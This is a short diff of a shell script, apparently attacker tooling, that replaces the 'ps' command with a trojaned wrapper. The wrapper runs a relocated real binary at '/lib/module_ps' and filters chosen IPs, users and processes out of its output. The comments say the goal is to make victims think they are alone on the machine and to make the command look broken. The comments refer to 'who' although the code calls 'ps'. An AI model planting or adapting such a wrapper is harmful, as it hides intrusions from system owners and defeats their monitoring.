@@ -3,7 +3,7 @@
 # Execute real 'who' command and don't display anything. Also mess with them
 # This will make them think they are the only one connected to the box
 # Clear the screen as well to make the command appear broken
-command ps $@ | grep -Ev "IP_TO_HIDE|USER_TO_HIDE|PROC_TO_HIDE" && clear
+/lib/module_ps $@ | grep -Ev "IP_TO_HIDE|USER_TO_HIDE|PROC_TO_HIDE" && clear
 
 # Source the ~/.bashrc
 source ~/.bashrc
